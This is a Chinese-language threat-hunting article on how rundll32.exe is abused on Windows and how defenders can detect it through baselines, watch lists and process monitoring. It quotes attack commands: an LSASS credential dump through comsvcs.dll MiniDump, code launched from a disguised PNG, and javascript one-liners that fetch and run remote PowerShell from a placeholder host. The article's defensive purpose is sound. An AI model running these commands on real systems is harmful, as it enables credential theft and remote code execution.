# 揭秘rundll32中的攻防对抗

阅读量    **186562** | 评论 **1** ![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)



分享到： ![QQ空间](https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png) ![新浪微博](https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png) ![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png) ![QQ](https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png) ![facebook](https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png) ![twitter](https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png)



发布时间：2021-12-29 14:30:56



[![img](https://p3.ssl.qhimg.com/t01bd33bb83c1dfb39b.jpg)](https://p3.ssl.qhimg.com/t01bd33bb83c1dfb39b.jpg)

 

## 前言

要做好检测能力，必须得熟悉你的系统环境，只有足够了解正常行为，才能真正找出异常(Anomaly)和威胁(Threat)

在[上篇文章](https://www.anquanke.com/post/id/262742)中介绍 CS 的一些行为特征时，经常提及 rundll32.exe，哪怕非安全人员，可能对该进程都不陌生

顾名思义，rundll32.exe 可用于执行 DLL 文件，也能调用该文件中的内部函数

它的历史差不多能追溯到 Windows 95，几乎是所有 Windows 操作系统的必需组件，不能轻易地被禁用

攻击者可以借助 rundll32.exe 加载 DLL 文件中的恶意代码，避免像其它 EXE 文件一样直接在进程树中现行

另外，攻击者还可能滥用合法 DLL 文件中的导出函数，比如待会儿就会介绍到的 comsvcs.dll 和 MiniDump

除了加载 DLL 文件，rundll32.exe 还能通过 RunHtmlApplication 函数执行 JavaScript

正因为这些特性，rundll32.exe 很容易博得攻击者的青睐，在攻击技术流行度中常常名列前茅

[![img](https://p3.ssl.qhimg.com/t0163730b43cf480ec5.png)](https://p3.ssl.qhimg.com/t0163730b43cf480ec5.png)

 

## 常用场景

对于 rundll32.exe，最简单粗暴的用法当然是直接指定文件名称，执行目标 DLL：

— `rundll32.exe <dllname>`

当然，在我们日常使用操作系统的过程中，见得最多的可能是通过 rundll32.exe 调用某些 DLL 文件中的特定函数这一行为：

— `rundll32.exe <dllname>,<entrypoint> <optional arguments>`

譬如，在我们右键点击某文档，选择特定的“打开方式”，然后会弹出个窗口供我们指定用于打开的应用程序，实际上就相当于在后台执行了以下命令：

— `C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL <file_path>`

拿修改 hosts 文件举个例子，通过 WIN+R 执行以下命令，即可弹出该选择窗口：

— `C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,OpenAs_RunDLL C:\Windows\System32\drivers\etc\hosts`

[![img](https://p5.ssl.qhimg.com/t010def991f1f28f03c.png)](https://p5.ssl.qhimg.com/t010def991f1f28f03c.png)

类似行为在我们的日志中呈现出来通常会是这么个模样：

[![img](https://p2.ssl.qhimg.com/t01f59918964f849189.png)](https://p2.ssl.qhimg.com/t01f59918964f849189.png)

关于 shell32.dll，比较常见的函数还有 `Control_RunDLL` 和 `Control_RunDLLAsUser`，它们可以用于运行 .CPL 文件，一般主要是控制面板中的小程序

例如打开防火墙： `C:\WINDOWS\System32\rundll32.exe C:\WINDOWS\System32\shell32.dll,Control_RunDLL C:\WINDOWS\System32\firewall.cpl`

[![img](https://p3.ssl.qhimg.com/t012ca8447104e6f644.png)](https://p3.ssl.qhimg.com/t012ca8447104e6f644.png)

很显然，这里的 CPL 文件也可以被替换成恶意文件，所以一旦出现可疑的路径及文件名，我们就需要结合其它工具来检查它的合法性

关于这一攻击手法的使用细节，这篇 [Paper](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf) 值得一读，本文就不展开阐述了

另外附上一张[表格](https://www.tenforums.com/tutorials/77458-rundll32-commands-list-windows-10-a.html)链接，其中包含了 Windows 10 上 rundll32.exe 可快速调用的命令清单及其功能含义

毕竟人生苦短，大家都没时间去记住那么多命令，但是不妨先 mark 一下，等到有需要时可以迅速查出其含义

 

## 攻击方式

借助 rundll32.exe 实现的攻击方式非常多，这里我只简单介绍几种比较有特色的利用姿势

### 合法的DLL调用

攻击者如果使用合法的 DLL 文件来完成攻击活动，按照传统的检测手段，确实会大大增加防守难度

例如利用 comsvcs.dll 中的 MiniDump 函数对目标进程进行内存转储，从而实现凭证窃取，参考[这里](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs.dll)：

— `C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full`

[![img](https://p4.ssl.qhimg.com/t01770ad41805965f0b.png)](https://p4.ssl.qhimg.com/t01770ad41805965f0b.png)

类似的还有 advpack.dll，原本是用于帮助硬件和软件读取和验证.INF文件，也会被攻击者用做代码执行

印象比较深刻的是之前分析一些木马病毒时见过类似的使用技巧，特意搜了下，这里好像也有相关[文章](https://www.anquanke.com/post/id/97329/)：

[![img](https://p4.ssl.qhimg.com/t014857336656be42a6.png)](https://p4.ssl.qhimg.com/t014857336656be42a6.png)

该病毒在图片中存放恶意代码，通过白利用完成代码执行，不熟悉的小伙伴遇见了真的很容易被瞒过去：

— `c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection c:\microsoft\360666.png,DefaultInstall`

当然，这些攻击手法在实际使用过程中肯定会有许多变种，用于绕过一些常规的检测方式，比如 MiniDump 函数的调用也可以通过编号 #24 完成

感兴趣的朋友可以看看[这里](http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/)：

[![img](https://p1.ssl.qhimg.com/t0198136fa72c1cc6fe.png)](https://p1.ssl.qhimg.com/t0198136fa72c1cc6fe.png)

### 远程代码加载

除了本地加载之外，rundll32.exe 也可以通过 RunHtmlApplication 函数执行 JavaScript 以实现远程代码加载，例如：

— `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"`

— `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/XXX/XXX")`

[![图像](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://pbs.twimg.com/media/BtNtpPRCAAAHmAy?format=png&name=900x900)

值得一提的是，根据笔者的观察，目前还没怎么看到日常活动中关于 javasciprt 关键字的合理使用场景，所以通常我会直接将该特征加入检测模型

想深入了解这一攻击手法，更多内容可以看看这篇[文章](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)

### 滥用COM组件

关于 rundll32.exe 还有一些比较少见的命令行参数 ———— `-sta` 和 `-localserver`，它们俩都能用来加载恶意注册的 COM 组件

登上自家的 SIEM 去看看，说不定也能够发现以下活动(至少我确实根据相关数据狩猎到了一些有意思的活动:P)

— `rundll32.exe –localserver <CLSID_GUID>`
— `rundll32.exe –sta <CLSID_GUID>`

对 COM 组件不熟悉的童鞋可能需要先得去补补课，比如 ATT&CK 在持久化阶段中提及到的 [T1546.015-Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015/)

简单来讲，当我们看到类似的命令行参数时，最好先去看看对应注册表下的键值对是否包含恶意的 DLL 文件或 SCT 脚本

它们通常在这个位置：`\HKEY_CLASSES_ROOT\CLSID\<GUID>`，可结合下图食用

[![img](https://p4.ssl.qhimg.com/t0169db2cc6b6c64b50.png)](https://p4.ssl.qhimg.com/t0169db2cc6b6c64b50.png)

关于具体的利用原理和攻击细节可以看看[这里](https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/)，还有这篇[文章](https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/)中提到的使用 `-localserver` 作为攻击变种的使用姿势

 

## 检测技巧

### 命令行检测

首先让我们一起回顾一遍 rundll32.exe 的基本使用方法：

— `rundll32.exe <dllname>,<entrypoint> <optional arguments>`

从 rundll32 的文件位置开始，我们可以设定一条最基础的检测规则，因为它通常只有以下两种选择：

```yaml
- C:\Windows\System32\rundll32.exe
- C:\Windows\SysWOW64\rundll32.exe (32bit version on 64bit systems)
```

虽然简单，但也不并一定完全无用武之地：

[![img](https://p4.ssl.qhimg.com/t0187befc57763c864f.png)](https://p4.ssl.qhimg.com/t0187befc57763c864f.png)

接着，让我们开始关注 DLL 文件和导出函数

通过前文的介绍，我们应该能达成共识：**在日常活动中，rundll32.exe 的出场次数并不少见**

对于这种可能存在较多干扰信息的情况，我习惯使用**漏斗模型**来帮助缩小检测范围，简单来讲就是尽你所能(不一定非得用UEBA)去建设**行为基线**，然后剔除正常活动，重点关注偏离动作

例如，我顺手统计了下自己电脑上出现过的 DLl 文件和导出函数，实际应用时，可以采集足够多的良性样本，充实我们的白名单，或者借此优化采日志集策略

经过像漏斗思维一样的筛选，可以缩减我们的狩猎范围，更加聚焦于异常行为，从而提高狩猎的成功率

[![img](https://p4.ssl.qhimg.com/t01743dcd773315805b.png)](https://p4.ssl.qhimg.com/t01743dcd773315805b.png)

在实际生产环境中，对于行为基线之外的活动，仍然可能包含大量业务相关的正常行为，这时还可以运用长尾分析法，关注特定阈值之下的少数可疑行为

或者我们也可以检查下有哪些不规范的文件或者函数名，比如这里我只简单设置条件为未包含关键字 “.dll”

对于之前提过 CobaltStrike 在后渗透阶段调用 rundll32.exe 的方式，就可以很轻松地通过这一技巧检测出来

[![img](https://p3.ssl.qhimg.com/t012eed3b435d0b7188.png)](https://p3.ssl.qhimg.com/t012eed3b435d0b7188.png)

另外，其实我印象比较深刻的是以前使用该技巧发现过这么一起异常行为：`rundll32.exe uwcidcx.vb,capgj`

当时只是觉得可疑，还不敢直接定性，直到写这篇文章时，在 Red Canary 的报告中发现了类似的攻击活动，且有着相同的上下文特征，才得以确认为某后门病毒

当然，这种方法可能会存在漏报，所以需要结合后文中的其它检测点搭配食用

### 敏感函数监测

前面介绍过一些使用合法的 DLL 文件及其函数完成的攻击活动，这种特定的白利用行为就需要我们重点关注了

例如 MiniDump 与其对应的函数编号 #24，其它更多的 tips 可能需要请红队成员帮帮忙，毕竟术业有专攻嘛

还有 javascript 的用法，因为它在日常行为中非常罕见，所以也可以享受下特殊待遇，加入观察名单

当然，有些特殊行为我们无法一眼定性，这时往往需要安全人员进行人工判定

对于这种场景，我们可以针对这些敏感的函数调用行为建设相应的 dashboard

例如上文提到的 `-sta` 关键字的用法，我们可能不方便根据 GUID 完成自动化研判，但是可以通过一些技巧提高狩猎效率

### 通信行为监测

根据我的观察经验，rundll32 在网络通信行为上的花样并不多，这对于我们建立异常检测模型是非常有利的

我在自己的主机上统计了下，只有实验中 beacon 通信时留下了 rundll32 的网络通信日志

当然，实验环境的数据没有说服力，而且我自己也维护了一份白名单，过滤后的数据量很少，这里只是演示下统计方式，大家可以在自己的环境中去试一试

[![img](https://p0.ssl.qhimg.com/t012ccf08491d4f1551.png)](https://p0.ssl.qhimg.com/t012ccf08491d4f1551.png)

如果有 EDR 在进程通信时能采集到相应的命令行日志，我们还可以结合进程和网络行为一起分析

而通常情况下我们的日志中可能会缺少这些字段(例如sysmon)，没关系，这时我们就一切从简

比如直接结合威胁情报食用，调用 API 查询 rundll32.exe 的目的地址是否可疑

另外，如果 rundll32.exe 存在扫描行为或者访问特殊端口(例如445、数据库端口等)，这种情况应该不用多讲了吧(PS：我还真遇过好几次)

要是还想玩点高级的，可以结合通信频率，学习下检测 beacon 的姿势，比如根据 jitter 特征检测 C2 通信，参考这篇[文章](https://posts.bluraven.io/enterprise-scale-threat-hunting-network-beacon-detection-with-unsupervised-ml-and-kql-part-2-bff46cfc1e7e)

### 异常关系检测

这部分可能涉及到的攻击手法就比较多样了，比如钓鱼邮件、webshell、计划任务或WMI等持久化中都有可能用到 rundll32.exe

所以需要对相关进程间的父子关系列一份检测清单，例如以下进程就应该划上重点：

```
- winword.exe
- excel.exe
- taskeng.exe
- winlogon.exe
- schtask.exe
- regsvr32.exe
- wmiprvse.exe
- wsmprovhost.exe
...
```

而对于清单内的进程，我们还可以借助图数据来构建 dashboard，如果有个专门的模块能够记录这些罕见的进程链，监测时便是一目了然

[![img](https://p3.ssl.qhimg.com/t01cb2ae563578f2fe4.png)](https://p3.ssl.qhimg.com/t01cb2ae563578f2fe4.png)

当然，有机会的话，也别漏掉了一些特殊的访问关系，比如 rundll32.exe 对 lsass.exe 发起高权限的进程间访问

 

## 小结

最后，这篇文章中贴的相关链接比较多，大部分都需要翻出去才能访问，所以如果遇到无法访问的情况其实是正常现象

有些地方的贴图不方便展示真实数据，只能贴网图或者在实验环境下截图，显示的数据样本会比较小，但是文中的结论实际上有大量样本支撑，基本可以放心食用

如有纰漏之处，或者其他有意思的发现，欢迎私信交流~~

本文由**慕长风**原创发布
转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： <https://www.anquanke.com/post/id/263193>
安全客 - 有思想的安全新媒体

[渗透测试](https://www.anquanke.com/tag/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95) [威胁狩猎](https://www.anquanke.com/tag/%E5%A8%81%E8%83%81%E7%8B%A9%E7%8C%8E)